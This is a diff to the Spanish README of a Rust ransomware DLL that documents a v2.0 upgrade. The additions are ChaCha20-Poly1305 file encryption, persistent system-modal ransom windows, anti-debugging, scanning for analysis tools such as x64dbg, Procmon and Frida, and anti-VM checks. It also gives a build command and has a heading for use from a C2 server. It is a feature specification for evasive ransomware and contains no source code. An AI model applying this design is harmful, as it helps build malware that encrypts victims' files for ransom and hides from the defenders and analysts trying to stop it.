@@ -10,9 +10,11 @@ El uso no autorizado de este software para encriptar sistemas que no te pertenec
 
 ## Descripción
 
-El ransomware-dll es un módulo de encriptación que implementa las siguientes funcionalidades:
+El ransomware-dll es un módulo de encriptación avanzado que implementa las siguientes funcionalidades:
 
-- **Encriptación AES-256-CBC**: Encriptación fuerte de archivos
+- **Encriptación AES-256-CBC y ChaCha20-Poly1305**: Múltiples algoritmos de encriptación fuerte
+- **Diálogos GUI de rescate**: Ventanas persistentes de Windows con mensajes de ransomware
+- **Anti-debugging y Anti-VM**: Detecta debuggers, herramientas de análisis y máquinas virtuales
 - **Descubrimiento recursivo de archivos**: Busca archivos en directorios con profundidad configurable
 - **Filtrado inteligente**: Evita archivos del sistema, ejecutables y archivos ya encriptados
 - **Generación de claves seguras**: Claves aleatorias de 256 bits
@@ -23,8 +25,10 @@ El ransomware-dll es un módulo de encriptación que implementa las siguientes f
 
 ### Módulos
 
-- **crypto.rs**: Implementación de AES-256-CBC manual
+- **crypto.rs**: Implementación de AES-256-CBC y ChaCha20-Poly1305
 - **fileops.rs**: Operaciones de archivos (descubrimiento, lectura, escritura)
+- **ransom_dialog.rs**: Diálogos GUI de Windows para mostrar mensajes de ransomware
+- **evasion.rs**: Técnicas de evasión (anti-debugging, anti-VM, detección de herramientas)
 - **lib.rs**: Interfaz C para exportar funciones
 
 ### Funciones Exportadas
@@ -62,8 +66,40 @@ cargo build --release --target x86_64-pc-windows-gnu --package ransomware-dll
 ### Salida
 
 ```
-target/x86_64-pc-windows-gnu/release/ransomware.dll (~399KB)
+target/x86_64-pc-windows-gnu/release/ransomware.dll (~423KB)
 ```
+
+## Nuevas Características (v2.0)
+
+### 1. Diálogos GUI de Ransomware
+
+El módulo ahora muestra ventanas nativas de Windows durante el proceso de encriptación:
+
+- **Progreso de encriptación**: Notifica al usuario que la encriptación está en progreso
+- **Mensaje de rescate**: Muestra información sobre los archivos encriptados con el Key ID
+- **Ventanas persistentes**: Usa `MB_SYSTEMMODAL | MB_TOPMOST` para mantener las ventanas en primer plano
+
+### 2. Evasión Avanzada
+
+Implementa múltiples técnicas de evasión antes de ejecutar:
+
+**Anti-Debugging:**
+- Detecta `IsDebuggerPresent()` 
+- El ransomware no se ejecuta si detecta un debugger
+
+**Anti-Analysis Tools:**
+- Detecta herramientas comunes: OllyDbg, x64dbg, IDA Pro, Process Hacker, Procmon, Wireshark, Fiddler, CheatEngine, Frida
+- Escanea procesos en ejecución usando `CreateToolhelp32Snapshot`
+
+**Anti-VM:**
+- Detecta máquinas virtuales por archivos de drivers (VMware, VirtualBox)
+- Verifica número bajo de CPUs (indicador de VM)
+
+### 3. Mejor Encriptación
+
+- **AES-256-CBC**: Método original, compatible con versiones anteriores
+- **ChaCha20-Poly1305**: Nuevo algoritmo AEAD más moderno y rápido
+- Ambos usan claves de 256 bits generadas aleatoriamente
 
 ## Uso desde C2
 
